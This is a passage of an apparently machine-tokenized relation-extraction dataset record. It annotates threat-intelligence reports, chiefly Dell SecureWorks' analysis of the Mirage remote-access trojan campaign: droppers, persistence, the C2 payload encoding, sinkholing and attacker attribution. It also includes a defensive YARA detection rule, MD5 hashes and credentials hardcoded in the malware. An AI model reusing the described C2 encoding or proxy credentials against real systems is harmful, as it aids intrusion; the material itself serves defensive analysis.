"a", "recipient", "to", "open", "a", "malicious", "file"], ["may", "at", "one", "point", "have", "actually", "been", "authentic", "and", "private", "\u2014", "and", "is", "that", "much", "more", "likely", "to", "appear"], ["legitimate", ".", "For", "tips", "on", "other", "ways", "to", "detect", "probable", "malware", "attacks", "and", "prevent", "compromise", ",", "see"], ["Citizen", "Lab\u2019s", "Recommendations", "for", "Defending", "Against", "Targeted", "Cyber", "Threats", "."], ["\uf0b7"], ["Civil", "society", "organizations", "should", "be", "wary", "of", "emails", "attaching", "password-protected", "documents", "and"], ["providing", "said", "password", "in", "the", "email", "body", ".", "Such", "purported", "\u201csecurity\u201d", "measures", "are", "not", "an", "indicator", "of"], ["authenticity", "."], ["\uf0b7"], ["Citizen", "Lab", "encourages", "civil", "society", "organizations", "and", "individuals", "working", "on", "human", "rights", "issues", "that"], ["have", "encountered", "these", "types", "of", "targeted", "malware", "attacks", "to", "contact", "us", "at", "hrthreats[AT]citizenlab", ".", "org."], ["We", "appreciate", "submission", "of", "data", ",", "which", "will", "help", "strengthen", "our", "analysis", "of", "cyber", "threats", "."], ["__________________"], ["FOOTNOTES"], ["1"], ["On", "April", "1", ",", "1955", ",", "the", "governments", "of", "India", "and", "China", "signed", "a", "protocol", "by", "which", "India", "handed", "over", "control"], ["of", "communications", "services", "in", "Tibet", "to", "China", ".", "See", "Protocol", "between", "the", "Governments", "of", "India", "and", "China"], ["Regarding", "the", "Handing", "Over", "of", "Postal", ",", "Telegraph", "and", "Public", "Telephone", "Services", "in", "the", "Tibet", "Region", "of"], ["China", "."], ["14"], ["Number", "10", "\u2013", "July", "2012"], ["2"], ["3"], ["The", "Fourteenth", "Dalai", "Lama", "Tenzin", "Gyatso", "was", "born", "on", "July", "6", ",", "1935", "."], ["The", "Thirteenth", "Dalai", "Lama", "Thupten", "Gyatso", "passed", "away", "on", "December", "17", ",", "1933", "."], ["15"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Campaign", "name": "Mirage", "sent_id": 0, "pos": [1]}, {"old_id": "T2", "type": "Organization", "name": "Dell SecureWorks Counter Threat Unit", "sent_id": 1, "pos": []}, {"old_id": "T3", "type": "TrojanHorse", "name": "Mirage", "sent_id": 7, "pos": [0]}, {"old_id": "T4", "type": "TrojanHorse", "name": "MirageFox", "sent_id": 7, "pos": []}, {"old_id": "T5", "type": "ExploitTargetObject", "name": "high-profile oil company", "sent_id": 7, "pos": []}, {"old_id": "T6", "type": "Country", "name": "Phillipines", "sent_id": 8, "pos": [3]}, {"old_id": "T7", "type": "ExploitTargetObject", "name": "military organization", "sent_id": 8, "pos": [6, 7]}, {"old_id": "T8", "type": "Country", "name": "Taiwan", "sent_id": 8, "pos": [9]}, {"old_id": "T9", "type": "ExploitTargetObject", "name": "energy company", "sent_id": 8, "pos": [12, 0]}, {"old_id": "T10", "type": "Country", "name": "Canada", "sent_id": 9, "pos": [0]}, {"old_id": "T11", "type": "Country", "name": "Brazil", "sent_id": 9, "pos": [9]}, {"old_id": "T12", "type": "Country", "name": "Israel", "sent_id": 9, "pos": [11]}, {"old_id": "T13", "type": "Country", "name": "Egypt", "sent_id": 9, "pos": [13]}, {"old_id": "T14", "type": "Country", "name": "Nigeria", "sent_id": 9, "pos": [15]}, {"old_id": "T15", "type": "Exploit", "name": "spearphishing email", "sent_id": 13, "pos": [2, 3]}, {"old_id": "T16", "type": "ExploitTargetObject", "name": "senior-level executives", "sent_id": 13, "pos": [8, 9]}, {"old_id": "T17", "type": "Malware", "name": "Mirage", "sent_id": 15, "pos": [0]}, {"old_id": "T18", "type": "MD5", "name": "ce1cdc9c95a6808945f54164b2e4d9d2", "sent_id": 19, "pos": []}, {"old_id": "T19", "type": "File", "name": "Yemeni Women can participate in politics just like men says President Saleh", "sent_id": 20, "pos": []}, {"old_id": "T20", "type": "TrojanHorse", "name": "Mirage", "sent_id": 18, "pos": [5]}, {"old_id": "T21", "type": "File", "name": "svchostexe", "sent_id": 31, "pos": []}, {"old_id": "T22", "type": "File", "name": "ernel32dll", "sent_id": 32, "pos": []}, {"old_id": "T23", "type": "File", "name": "thumbdb", "sent_id": 33, "pos": []}, {"old_id": "T24", "type": "File", "name": "csrssexe", "sent_id": 34, "pos": []}, {"old_id": "T25", "type": "File", "name": "Reader_SLexe", "sent_id": 35, "pos": []}, {"old_id": "T26", "type": "File", "name": "MSNexe", "sent_id": 36, "pos": []}, {"old_id": "T27", "type": "TrojanHorse", "name": "Mirage", "sent_id": 28, "pos": [16]}, {"old_id": "T28", "type": "MalwareFamily", "name": "JKDDOS", "sent_id": 38, "pos": [13]}, {"old_id": "T29", "type": "TrojanHorse", "name": "Mirage", "sent_id": 38, "pos": [4]}, {"old_id": "T30", "type": "SystemInformation", "name": "CPU speed", "sent_id": 39, "pos": [27, 28]}, {"old_id": "T31", "type": "SystemInformation", "name": "memory size", "sent_id": 39, "pos": [30, 31]}, {"old_id": "T32", "type": "SystemInformation", "name": "system name", "sent_id": 39, "pos": [16, 34]}, {"old_id": "T33", "type": "SystemInformation", "name": "username", "sent_id": 39, "pos": [36]}, {"old_id": "T34", "type": "MalwareCharacteristics", "name": "HTTP request", "sent_id": 41, "pos": [10, 11]}, {"old_id": "T35", "type": "Indicator", "name": "Mjtdkj", "sent_id": 82, "pos": []}, {"old_id": "T36", "type": "Malware", "name": "Mirage", "sent_id": 82, "pos": []}, {"old_id": "T37", "type": "SystemInformation", "name": "MAC address", "sent_id": 83, "pos": [8, 9]}, {"old_id": "T38", "type": "SystemInformation", "name": "CPU information", "sent_id": 83, "pos": [11, 12]}, {"old_id": "T39", "type": "MalwareCharacteristics", "name": "HTTP GET", "sent_id": 93, "pos": [6, 7]}, {"old_id": "T40", "type": "Malware", "name": "Mirage", "sent_id": 93, "pos": [4]}, {"old_id": "T41", "type": "MalwareFamily", "name": "Lingbo", "sent_id": 100, "pos": [22]}, {"old_id": "T42", "type": "MD5", "name": "fa26f410d0133f4152ea78df3978c22", "sent_id": 117, "pos": []}, {"old_id": "T43", "type": "Country", "name": "Taiwan", "sent_id": 138, "pos": [16]}, {"old_id": "T44", "type": "Country", "name": "Philippines", "sent_id": 138, "pos": [19]}, {"old_id": "T45", "type": "Country", "name": "Nigeria", "sent_id": 138, "pos": [26]}, {"old_id": "T46", "type": "Country", "name": "Brazil", "sent_id": 139, "pos": [0]}, {"old_id": "T47", "type": "Country", "name": "Israel", "sent_id": 139, "pos": [2]}, {"old_id": "T48", "type": "Country", "name": "Canada", "sent_id": 139, "pos": [4]}, {"old_id": "T49", "type": "Country", "name": "Egypt", "sent_id": 139, "pos": [6]}, {"old_id": "T50", "type": "Exploit", "name": "dynamic domain name system", "sent_id": 147, "pos": [14, 17]}, {"old_id": "T51", "type": "Software", "name": "HTran", "sent_id": 151, "pos": [0]}, {"old_id": "T52", "type": "AttackerGroup", "name": "HUC", "sent_id": 154, "pos": [6]}, {"old_id": "T53", "type": "Indicator", "name": "asia-onlineus", "sent_id": 183, "pos": []}, {"old_id": "T54", "type": "Indicator", "name": "india-videoercom", "sent_id": 183, "pos": []}, {"old_id": "T55", "type": "Indicator", "name": "Echoskybiz", "sent_id": 183, "pos": []}, {"old_id": "T56", "type": "Campaign", "name": "Sin Digoo", "sent_id": 185, "pos": [7, 0]}, {"old_id": "T57", "type": "Indicator", "name": "jeno_1980@hotmailcom", "sent_id": 185, "pos": []}, {"old_id": "T58", "type": "Indicator", "name": "king@hotmailcom", "sent_id": 185, "pos": []}, {"old_id": "T59", "type": "CourseOfAction", "name": "Yara", "sent_id": 195, "pos": [3]}, {"old_id": "T60", "type": "Malware", "name": "Mirage", "sent_id": 189, "pos": [0]}], "labels": [{"old_id": "R1", "r": "P21", "h": 17, "t": 16, "evidence": []}, {"old_id": "R2", "r": "P21", "h": 18, "t": 19, "evidence": []}, {"old_id": "R3", "r": "P21", "h": 20, "t": 26, "evidence": []}, {"old_id": "R4", "r": "P21", "h": 21, "t": 26, "evidence": []}, {"old_id": "R5", "r": "P21", "h": 22, "t": 26, "evidence": []}, {"old_id": "R6", "r": "P21", "h": 23, "t": 26, "evidence": []}, {"old_id": "R7", "r": "P21", "h": 24, "t": 26, "evidence": []}, {"old_id": "R8", "r": "P21", "h": 25, "t": 26, "evidence": []}, {"old_id": "R9", "r": "P14", "h": 28, "t": 27, "evidence": [38]}, {"old_id": "R10", "r": "P13", "h": 28, "t": 33, "evidence": [38, 39, 40, 41]}, {"old_id": "R11", "r": "P21", "h": 34, "t": 35, "evidence": [82]}, {"old_id": "R12", "r": "P13", "h": 39, "t": 38, "evidence": [93]}, {"old_id": "R13", "r": "P34", "h": 58, "t": 59, "evidence": []}], "title": ["inputs/txt/201209DellSecureWorksMirage"], "sents": [["The", "Mirage", "Campaign"], ["Author:", "Silas", "Cutler", ",", "Dell", "SecureWorks", "Counter", "Threat", "Unit(TM)", "Threat", "Intelligence"], ["Date:", "18", "September", "2012"], ["URL:", "http://www", ".", "secureworks.com/research/threats/the-mirage-campaign/"], ["Introduction"], ["Since", "April", "2012", ",", "the", "Dell", "SecureWorks", "Counter", "Threat", "Unit\u2122", "(CTU)", "research", "team", "has"], ["been", "tracking", "a", "cyber", "espionage", "campaign", "that", "uses", "a", "remote", "access", "trojan", "(RAT)", "named"], ["Mirage", "(also", "known", "as", "MirageFox)", ".", "This", "ongoing", "attack", "has", "targeted", "a", "high-profile", "oil"], ["company", "in", "the", "Phillipines", ",", "a", "military", "organization", "in", "Taiwan", ",", "an", "energy", "company", "in"], ["Canada", ",", "and", "several", "as", "yet", "unidentified", "entities", "in", "Brazil", ",", "Israel", ",", "Egypt", "and", "Nigeria", "."], ["Analysis"], ["Distribution", "vector"], ["Based", "on", "the", "data", "collected", "by", "the", "CTU", "research", "team", ",", "the", "campaign's", "primary", "attack"], ["vector", "is", "spearphishing", "email", "that", "targets", "mid-level", "to", "senior-level", "executives", ".", "These"], ["emails", "contain", "an", "attachment", "that", "includes", "a", "malicious", "payload", "that", "installs", "a", "copy", "of"], ["Mirage", "."], ["CTU", "researchers", "have", "identified", "several", "files", "that", "drop", "and", "execute", "a", "copy", "of", "Mirage"], ["onto", "a", "target", "system", ".", "These", "\"droppers\"", "are", "designed", "to", "look", "and", "behave", "like", "PDF", "documents", ".", "However", ",", "the", "droppers", "are", "stand-alone", "executable", "files", "that", "open", "an", "embedded"], ["PDF", "file", "and", "execute", "the", "Mirage", "trojan", ".", "In", "one", "example", ",", "CTU", "researchers", "observed", "an"], ["executable", "file", "(MD5", "hash", "ce1cdc9c95a6808945f54164b2e4d9d2)", "that", "upon", "execution"], ["drops", "a", "copy", "of", "Mirage", "and", "opens", "an", "embedded", "PDF", "of", "a", "news", "story", "titled", "\"Yemeni"], ["Women", "can", "participate", "in", "politics", "just", "like", "men", ",", "says", "President", "Saleh\"", "that", "was", "posted"], ["on", "the", "Yemen", "Observer's", "website", "."], ["Behavior", "analysis"], ["The", "CTU", "research", "team", "has", "identified", "two", "main", "variants", "of", "the", "Mirage", "trojan", ".", "These"], ["variants", "are", "based", "on", "key", "evolutionary", "differences", "in", "the", "execution", "and", "encodings", "used"], ["in", "communication", "with", "the", "command", "and", "control", "(C2)", "servers", "."], ["When", "Mirage", "executes", ",", "the", "original", "file", "copies", "itself", "to", "a", "folder", "under", "C:\\Documents"], ["and", "Settings\\<USER>\\", "or", "C:\\Windows\\", "and", "then", "deletes", "the", "original", "file", ".", "After", "the", "initial", "copy", ",", "Mirage", "starts", "the", "newly", "created", "file", "and", "exits", "the", "original", ".", "The", "newly", "started"], ["copy", "creates", "registry", "keys", "to", "ensure", "that", "the", "system", "remains", "infected", "after", "every", "reboot", "."], ["CTU", "researchers", "have", "observed", "the", "following", "filenames", "created", "after", "execution:"], ["svchost", ".", "exe"], ["ernel32", ".", "dll"], ["thumb", ".", "db"], ["csrss", ".", "exe"], ["Reader_SL", ".", "exe"], ["MSN", ".", "exe"], ["Phone-home", "and", "C2", "operations"], ["The", "data", "sent", "by", "Mirage", "shares", "attributes", "with", "the", "malware", "family", "known", "as", "JKDDOS", ","], ["which", "was", "researched", "by", "Arbor", "Networks", ".", "In", "its", "initial", "phone-home", "connection", ",", "JKDDOS", "sends", "a", "system", "profile", "to", "the", "C2", "server", ".", "This", "profile", "contains", "the", "CPU", "speed", ",", "memory", "size", ",", "system", "name", "and", "username", ".", "Similar", "information", "and", "encoding", "techniques", "are"], ["seen", "in", "the", "initial", "phone-home", "requests", "of", "Mirage", "infections", "."], ["Mirage", "phones", "home", "to", "its", "C2", "servers", "using", "a", "standard", "HTTP", "request", ".", "From", "the", "activity"], ["CTU", "researchers", "have", "observed", "when", "executing", "Mirage", "in", "a", "malware", "sandbox", ",", "this"], ["communication", "commonly", "occurs", "over", "ports", "80", ",", "443", "and", "8080", ",", "and", "it", "can", "implement", "SSL"], ["for", "added", "security", "."], ["The", "earliest", "variant", "of", "Mirage", "uses", "an", "HTTP", "POST", "request", "to", "transmit", "the", "initial", "phonehome", "request", ".", "This", "phone-home", "request", "contains", "detailed", "system", "information", "of", "the", "infected", "system", "to", "give", "the", "C2", "server", "a", "rough", "profile", "of", "each", "system", "that", "is", "infected", "and"], ["that", "is", "calling", "home", "."], ["Figure", "1", ".", "Phone-home", "request", "(variant", "1)", "."], ["The", "payload", "is", "encoded", "with", "a", "simple", "cipher", "to", "mask", "the", "data", "being", "sent", "to", "the", "C2", "server", ".", "The", "cipher", "encodes", "the", "payload", "by", "adding", "each", "character's", "ASCII", "value", "by", "its", "offset"], ["from", "the", "start", "of", "the", "payload", "."], ["Raw", "values"], ["M"], ["i"], ["r"], ["a"], ["g"], ["e"], ["Raw", "hex"], ["0x4d", "0x69", "0x72", "0x61", "0x67", "0x65"], ["Raw", "decimal"], ["77"], ["105"], ["114"], ["97"], ["103"], ["101"], ["Encoded", "decimal", "77"], ["106"], ["116"], ["100"], ["107"], ["106"], ["Encoded", "hex"], ["0x4d", "0x6a", "0x74", "0x64", "0x6b", "0x6a"], ["Encoded", "values"], ["M"], ["j"], ["t"], ["d"], ["k"], ["j"], ["Table", "1", ".", "Payload", "encoding", "."], ["The", "initial", "payload", "starts", "with", "the", "word", "\"Mirage\"", ",", "which", "in", "its", "encoded", "state", "is", "\"Mjtdkj\"", "."], ["From", "there", ",", "Mirage", "encodes", "and", "sends", "the", "MAC", "address", ",", "CPU", "information", ",", "system"], ["name", "and", "username", "in", "the", "initial", "request", "to", "the", "C2", "server", "."], ["If", "the", "C2", "server", "successfully", "receives", "the", "request", ",", "then", "it", "responds", "with", "an", "HTTP", "response", "code", "\"200", "OK\"", ".", "The", "word", "\"Mirage\"", "appears", "in", "its", "payload", ",", "followed", "by", "two", "null"], ["bytes", ".", "If", "there", "is", "no", "response", "or", "an", "invalid", "response", "from", "the", "C2", "server", ",", "the", "infected", "system", "continues", "to", "send", "its", "initial", "phone-home", "request", "at", "regular", "intervals", "."], ["Figure", "2", ".", "Decoded", "payload", "(variant", "1)", "."], ["If", "the", "infected", "system", "connects", "successfully", "to", "the", "C2", "server", ",", "then", "the", "infected", "system"], ["continues", "to", "send", "regular", "check-in", "updates", ".", "These", "updates", "are", "transmitted", "the", "same"], ["way", "as", "the", "initial", "phone-home", "request;", "however", ",", "only", "the", "MAC", "address", "of", "the", "infected"], ["system", "is", "sent", "in", "the", "payload", "."], ["Figure", "3", ".", "Decoded", "check-in", "update", "(variant", "1)", "."], ["The", "second", "variant", "of", "Mirage", "uses", "HTTP", "GET", "requests", "instead", "of", "HTTP", "POST", "requests"], ["to", "transmit", "the", "phone-home", "requests'", "payload", ".", "This", "evolved", "variant's", "initial", "phonehome", "request's", "payload", "is", "contained", "in", "a", "Base64-encoded", "string", "in", "the", "initial", "request", "."], ["The", "decoded", "Base64", "payload", "contains", "a", "second", "level", "of", "encoding", "that", "has", "several", "variations", ".", "The", "data", "being", "transmitted", "in", "the", "encoded", "string", "contains", "the", "same", "data", "as", "the"], ["previous", "variant", ",", "as", "well", "as", "some", "additional", "data", ".", "One", "change", "is", "the", "text", "at", "the", "beginning", "of", "the", "phone-home", "payload", ".", "Instead", "of", "the", "word", "\"Mirage\"", "used", "in", "earlier", "variants", ","], ["later", "variants", "use", "the", "phrase", "\"Neo", ",", "welcome", "to", "the", "desert", "of", "the", "real\"", ",", "a", "quote", "from", "the"], ["movie", "The", "Matrix", "."], ["Figure", "4", ".", "Sample", "request", "(variant", "2)", "."], ["The", "CTU", "research", "team", "has", "seen", "the", "encoding", "used", "in", "variant", "2", "in", "other", "malware", "families", ".", "One", "such", "malware", "family", "is", "Lingbo", ",", "which", "uses", "a", "similar", "encoding", "algorithm", "but"], ["does", "not", "contain", "some", "of", "the", "major", "characteristics", "of", "Mirage", ".", "Samples", "from", "both", "malware", "families", "have", "included", "strange", "embedded", "quotes", ".", "Instead", "of", "Mirage's", "quote", "from"], ["The", "Matrix", ",", "Lingbo", "contains", "the", "embedded", "quote", "\"It", "is", "the", "end", "of", "the", "world", "and", "I", "feel"], ["Fine\"", ",", "from", "the", "REM", "song", "\"It's", "the", "end", "of", "the", "world", ".", "\""], ["Custom", "versions", "and", "variants"], ["The", "CTU", "research", "team", "identified", "several", "Mirage", "variants", "that", "had", "unique", "attributes", "not"], ["designed", "for", "widespread", "targeting", ".", "These", "custom", "variants", "were", "designed", "to", "operate", "under", "specific", "conditions", "and", "to", "evade", "common", "system", "defenses", ".", "CTU", "researchers", "also"], ["found", "several", "samples", "that", "contained", "debugging", "information", ",", "possibly", "from", "early", "versions", "."], ["One", "of", "the", "variants", "was", "seen", "in", "a", "subset", "of", "samples", "that", "had", "been", "modified", "specifically"], ["for", "the", "environment", "targeted", "by", "the", "threat", "actors", ".", "These", "samples", "had", "been", "configured"], ["with", "default", "credentials", "for", "the", "targeted", "environment's", "web", "proxy", "servers", ".", "The", "following", "proxy", "usernames", "and", "password", "combinations", "appear", "in", "the", "samples", "collected", "by"], ["the", "CTU", "research", "team:"], ["a1:a1"], ["pagmb:pa"], ["quickheal:quickheal"], ["In", "the", "debugging", "versions", ",", "the", "CTU", "research", "team", "discovered", "two", "strings", "that", "identified"], ["the", "source", "code", "paths", "from", "which", "the", "samples", "were", "compiled:"], ["D:\\", ".", "...\\MF-v1.2\\Server\\Debug\\Server.pdb", "(MD5", "hash", "fa26f410d0133f4152ea78df3978c22)"], ["E:\\fox_1", ".", "2", "20110307\\MF-v1", ".", "2\\Server\\Release\\MirageFox_Server.pdb", "(MD5", "hash"], ["1045e26819ff782015202838e2c609f7)"], ["The", "", ".", "pdb", "file", "extension", "is", "commonly", "used", "with", "Microsoft", "Visual", "Studio", ".", "Its", "use", "in", "these"], ["debugging", "versions", "coincides", "with", "the", "samples", "for", "Mirage", ",", "which", "were", "written", "using"], ["Microsoft", "Visual", "C++", ".", "CTU", "researchers", "also", "noted", "that", "the", "original", "name", "of", "the", "trojan"], ["used", "in", "the", "path", "is", "MirageFox", ",", "which", "is", "likely", "the", "name", "used", "by", "the", "threat", "actors", "."], ["This", "information", "leads", "to", "two", "potential", "conclusions:"], ["1", ".", "The", "two", "variants", "of", "MF-v1", ".", "2,", "the", "debug", "version", "and", "the", "release", "version", ",", "allow", "the"], ["threat", "actors", "to", "customize", "variants", ".", "CTU", "researchers", "have", "already", "seen", "this", "activity", "."], ["2", ".", "The", "use", "of", "different", "drive", "letters", "but", "similar", "source", "code", "paths", "may", "indicate", "that"], ["the", "threat", "actors", "are", "keeping", "a", "repository", "of", "tools", "on", "a", "central", "file", "server", "for", "shared"], ["use", "."], ["Identification", "of", "victims"], ["From", "May", "to", "the", "date", "of", "this", "publication", ",", "the", "CTU", "research", "team", "engaged", "in", "a", "sinkholing", "operation", ".", "During", "the", "operation", ",", "several", "of", "the", "domains", "formerly", "used", "as", "part", "of", "the"], ["C2", "infrastructure", "were", "taken", "over", ",", "and", "all", "activity", "to", "the", "domains", "was", "logged", ".", "The", "sinkholed", "domains", "were", "no", "longer", "in", "use", "and", "were", "freely", "available", "for", "registration", "."], ["During", "the", "operation", ",", "CTU", "researchers", "were", "able", "to", "identify", "approximately", "80", "IP", "addresses", "regularly", "communicating", "to", "the", "sinkhole", ".", "After", "analyzing", "and", "decoding", "the", "requests", ",", "CTU", "researchers", "discovered", "that", "a", "subset", "of", "the", "observed", "systems", "had", "usernames", "such", "as", "\"admin\"", "or", "\"owner\"", ",", "and", "the", "originating", "IP", "address", "resolved", "to", "either", "a"], ["residence", "or", "an", "antivirus", "or", "security", "company", ".", "Because", "these", "requests", "were", "most", "likely"], ["from", "behavioral", "testing", "on", "the", "malware", "sample", ",", "the", "CTU", "research", "team", "filtered", "these"], ["connections", "out", "of", "the", "results", "."], ["After", "decoding", "the", "inbound", "requests", ",", "the", "CTU", "research", "team", "identified", "approximately"], ["100-120", "infected", "systems", "attempting", "to", "phone", "home", ".", "The", "majority", "of", "the", "inbound", "requests", "came", "from", "Taiwan", "or", "the", "Philippines", ",", "with", "several", "isolated", "cases", "in", "Nigeria", ","], ["Brazil", ",", "Israel", ",", "Canada", "and", "Egypt", ".", "Many", "of", "the", "IP", "addresses", "originate", "from", "networks"], ["owned", "by", "the", "oil", "company", ",", "energy", "company", ",", "and", "military", "organization", "."], ["Deeper", "analysis", "of", "the", "phone-home", "requests", "and", "correlation", "with", "social", "networking"], ["sites", "allowed", "CTU", "researchers", "to", "identify", "a", "specific", "individual", "infected", "with", "Mirage", ".", "It"], ["was", "an", "executive-level", "finance", "manager", "of", "the", "Phillipine-based", "oil", "company", "."], ["Figure", "5", ".", "Sources", "of", "infected", "hosts", "."], ["Threat", "actors"], ["The", "threat", "actors", "using", "Mirage", "have", "employed", "several", "tactics", "to", "attempt", "to", "hide", "their"], ["identities", "and", "their", "primary", "C2", "servers", ".", "One", "of", "the", "common", "tactics", "is", "using", "dynamic", "domain", "name", "system", "(dDNS)", "domains", "for", "the", "callbacks", "to", "the", "C2", "servers", ".", "dDNS", "providers"], ["(e", ".", "g.,", "Dyndns", ".", "com)", "allow", "anyone", "to", "register", "for", "a", "free", "third-level", "domain", "(e", ".", "g.,", "Checkip", ".", "dyndns.org)", "and", "require", "only", "a", "valid", "email", "address", ",", "which", "is", "kept", "private", "."], ["When", "investigating", "the", "DNS", "addresses", "of", "the", "C2", "servers", ",", "CTU", "researchers", "identified"], ["several", "IP", "addresses", "of", "hosting", "companies", "based", "in", "the", "United", "States", "that", "are", "running"], ["HTran", ".", "HTran", "software", "is", "used", "to", "proxy", "connections", "from", "one", "system", "to", "another", ".", "In", "the"], ["past", ",", "it", "has", "been", "used", "to", "disguise", "the", "true", "C2", "servers", "used", "by", "malware", "authors", ".", "In", "the"], ["CTU", "research", "team's", "2011", "analysis", "of", "HTran", ",", "the", "software's", "author", "was", "identified", "as", "a"], ["member", "of", "the", "Chinese", "hacker", "group", "HUC", ",", "the", "Honker", "Union", "of", "China", "."], ["Despite", "efforts", "to", "operate", "anonymously", ",", "there", "were", "several", "clues", "that", "pointed", "to", "the", "true"], ["identities", "of", "the", "attackers", ".", "During", "an", "analysis", "of", "the", "phone-home", "activity", ",", "CTU", "researchers", "identified", "four", "unique", "second-level", "domains", "that", "were", "not", "connected", "to", "a"], ["dDNS", "provider", ".", "Two", "of", "these", "domains", "shared", "a", "common", "owner's", "email", "address", ",", "and"], ["two", "were", "previously", "flagged", "for", "suspicious", "activity", "."], ["C2", "domain", "name"], ["Owner", "name", "Owner", "email"], ["Adobesuit", ".", "com"], ["nie", "min"], ["dnsjacks@yahoo", ".", "com"], ["antivirusbar", ".", "org"], ["white", "jacks"], ["dnsjacks@yahoo", ".", "com"], ["Echosky", ".", "biz"], ["tawnya", "grilth", "jeno_1980@hotmail", ".", "com"], ["India-videoer", ".", "com", "india", "videoer", "king@hotmail", ".", "com"], ["Asia-online", ".", "us"], ["bkpathak"], ["king_public@hotmail", ".", "com", "/", "kings@hotmail", ".", "com"], ["Table", "2", ".", "Unique", "second-level", "domains", "."], ["CTU", "researchers", "correlated", "86%", "of", "the", "IP", "addresses", "the", "dDNS", "domains", "used", "in", "the"], ["phone-home", "request", "to", "IP", "addresses", "of", "subdomains", "belonging", "to", "domains", "owned", "by"], ["dnsjacks@yahoo", ".", "com.", "Of", "the", "remaining", "14%", "that", "were", "not", "directly", "associated", ",", "CTU", "re-"], ["searchers", "correlated", "10%", "to", "IP", "ranges", "that", "resolved", "to", "subdomains", "owned", "by"], ["dnsjacks@yahoo", ".", "com."], ["Figure", "6", ".", "Analysis", "of", "IP", "addresses", ".", "(Source:", "Dell", "SecureWorks)"], ["This", "link", "between", "the", "IP", "addresses", "and", "the", "subdomains", "indicates", "that", "dnsjacks@yahoo", ".", "com", "owns", "the", "dDNS", "domains", ".", "Using", "historical", "DNS", "records", ",", "CTU", "researchers", "were", "able"], ["to", "map", "each", "of", "the", "dDNS", "domains", "to", "a", "subdomain", "of", "a", "domain", "owned", "by", "dnsjacks@yahoo", ".", "com."], ["Figure", "7", ".", "Details", "of", "IP", "range", "."], ["In", "the", "samples", "CTU", "researchers", "analyzed", ",", "the", "other", "domains", "associated", "with", "the", "phonehome", "activity", "are", "asia-online", ".", "us,", "india-videoer", ".", "com", "and", "Echosky", ".", "biz.", "The", "CTU", "research"], ["team", "previously", "flagged", "these", "domains", "in", "the", "HTran", "investigation", "and", "later", "in", "the", "Sin"], ["Digoo", "analysis", ".", "The", "analysis", "of", "the", "Sin", "Digoo", "affair", "indicated", "that", "jeno_1980@hotmail", ".", "com", "and", "king@hotmail", ".", "com", "were", "connected", ".", "From", "the", "data", "the", "CTU", "research", "team", "has"], ["collected", ",", "indications", "point", "to", "dnsjacks@yahoo", ".", "com", "being", "either", "another", "alias", "or", "an", "associate", "of", "the", "actor", "referenced", "in", "the", "HTran", "and", "Sin", "Digoo", "analyses", "."], ["Figure", "8", ".", "A", "common", "phone", "number", "was", "found", "to", "link", "india-videoer", ".", "com", "and", "asia-online", ".", "us"], ["Conclusion"], ["Mirage", "represents", "only", "one", "small", "piece", "of", "malware", "involved", "in", "an", "ongoing", "worldwide"], ["campaign", ".", "Over", "the", "past", "few", "years", ",", "these", "campaigns", "have", "become", "extremely", "successful", ","], ["and", "a", "great", "deal", "of", "intellectual", "property", "and", "company", "secrets", "has", "been", "stolen", "from", "the"], ["targeted", "companies", "."], ["For", "companies", "in", "the", "targeted", "industries", ",", "it", "is", "important", "to", "have", "a", "strong", "perimeter", "security", "line", "in", "place", ".", "Using", "active", "intrusion", "detection", "and", "prevention", "systems", "as", "well", "as"], ["DNS", "monitoring", "for", "malicious", "domains", "is", "essential", "to", "detecting", "this", "activity", ".", "Companies"], ["that", "use", "the", "Yara", "malware", "identification", "and", "classification", "tool", "for", "scanning", "local", "systems", "can", "use", "the", "rules", "provided", "in", "the", "appendix", "to", "search", "for", "potential", "infections", "."], ["Traditionally", ",", "the", "success", "of", "botnets", "created", "by", "threat", "actor", "groups", "has", "been", "measured"], ["by", "the", "quantity", "of", "infected", "systems", "and", "the", "difficulty", "to", "defend", "against", "in", "the", "long", "term", "."], ["These", "targeted", "attacks", "show", "that", "a", "successful", "campaign", "requires", "only", "a", "small", "quantity"], ["of", "infected", "systems", "to", "accomplish", "the", "attackers'", "objectives", "and", "to", "yield", "extremely", "power-"], ["ful", "results", "."], ["Appendix"], ["Yara", "rules"], ["rule", "Mirage_APT_Backdoor", ":", "APT", "Mirage", "Backdoor", "Rat", "MirageRat"], ["{"], ["meta:"], ["author", "=", "\"Silas", "Cutler", "(SCutler@SecureWorks", ".", "\u2010"], ["com)\""], ["version", "=", "\"1", ".", "0\""], ["description", "=", "\"Malware", "related", "to", "APT", "cam\u2010"], ["paign\""], ["type", "=", "\"APT", "Trojan", "/", "RAT", "/", "Backdoor\""], ["strings:"], ["$a1", "=", "\"welcome", "to", "the", "desert", "of", "the", "real\""], ["$a2", "=", "\"Mirage\""], ["$b", "=", "\"Encoding:", "gzip\""], ["$c", "=", "/\\/[A-Za-z]*\\", "?", "hl=en/"], ["condition:"], ["(($a1", "or", "$a2)", "or", "$b)", "and", "$c"], ["}"], ["MD5", "hashes"], ["5efd0d7f52890291599c8562e8ea92db"], ["eacd03ee55ea7d22b45762c82ae1c0e5"], ["ce1cdc9c95a6808945f54164b2e4d9d2"], ["5326e4fe9fd10e37d46e81c0f6bbf29a"], ["b2e821828df59c734c1cc379ef7f3122"], ["875877eedcd9f2d60bf63937fe22073d"], ["02d77cdaa808ded64d09eea732a586cc"], ["18a5c6e92b962bc6512486db94bb17a7"], ["32b33321290ac8011aa218da554b8fa5"], ["f41896e9f77855842380fd9ed795bc64"], ["407c291cd5c73da680fa9af9ec017fff"], ["7adb0f22468c10901bd280b2d8a154b0"], ["abac650ab39c0dd074310710081d715d"], ["c9e49c504d5ca953c858d29b7a2acb9d"], ["aaa9aae486ee7342d29a0a2f9b0ca205"], ["7ad79f9a0efde6f4673585e400f29f18"], ["f51fbafc652e10a9ce13795d4cb2d449"], ["a748ff9663b2d39a35e4c073b73cd7f6"], ["e7d5ac11903c0217a999a79bc87182d2"], ["1b918c8a40dc4a66430cfec7dabeb7f3"], ["c72d7794dc7f2eda6b44b934fe8fff1c"], ["ad2dda9241cd6c0e879ab665d77ce13c"], ["ccf34d2ba81de856af8167e73d0c8b69"], ["ebe7699033424b9ef444364bd23ba665"], ["7349c7908a672de885fdf9f9cc4547b5"], ["eacd14ce8414911546cb027a8cb2fecd"], ["4b9723a4060838114e53d1df3fa2537a"], ["070ef82a0bded089b6f996a392ca7b9a"], ["286f7b377f5d0ca3505ed1ba6601c947"], ["4d74a83e2f623f17e17eb95736dc587b"], ["a4b9bfc5aa5e37cc613112b9a9dcdb3e"], ["fb17ffc7495880a7c19df0ebe5c97ad7"], ["e29ab99be392bb7012f516a2dbfdc00c"], 